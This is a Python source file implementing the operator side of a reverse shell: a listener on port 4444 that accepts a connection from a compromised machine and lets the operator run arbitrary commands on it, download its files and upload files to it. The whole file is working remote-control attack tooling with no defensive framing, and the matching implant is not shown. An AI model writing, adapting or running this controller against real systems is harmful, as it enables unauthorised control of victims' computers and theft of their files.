from termcolor import colored
import socket, base64, os, time

class ReverseShellServer:
    def __init__(self, port):
        self.port = port
        socket.SO_REUSEPORT = socket.SO_REUSEADDR
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)

        self.s.bind(("0.0.0.0", port))
        self.s.listen(1) #listen for connections
        print(colored(f"[+] Listening For Connections: 0.0.0.0:{self.port}", 'green'))
        self.conn, self.addr = self.s.accept()
        print(colored(f'[+] Connection Established {self.addr[0]}:{self.addr[1]}', 'green'))

    def safe_send(self, data):
        time.sleep(0.5)
        self.conn.send(data)

    def safe_recv(self):
        all_data = b""
        while True:
            part = self.conn.recv(1024)
            all_data += part
            if len(part) < 1024:
                break
        return all_data.decode()

    def reverse_shell_host(self):
        while True:
            command = input(colored(f"<shell@{self.addr[0]}>:-$ ", "red"))
            self.safe_send(command.encode())
            if command == 'quit' or command == 'exit':
                break

            elif command[:2] == "cd" and len(command) > 1:
                continue

            elif command[:8] == "download":
                try:
                    file_data = self.safe_recv()
                    if file_data != "[!]":
                        with open(command[9:], 'wb') as file:
                            file.write(base64.b64decode(file_data))
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
                    print(self.safe_recv())
            
            elif command[:6] == "upload":
                try:
                    if os.path.exists(command[7:]):
                        with open(command[7:], 'rb') as file:
                            self.safe_send(base64.b64encode(file.read()))
                    else:
                        self.safe_send(b"[!]")
                        raise Exception
                except Exception:
                    print(self.safe_recv())
        
            else:
                result = self.safe_recv()
                print(result)

if __name__ == "__main__":
    ReverseShellServer(4444).reverse_shell_host()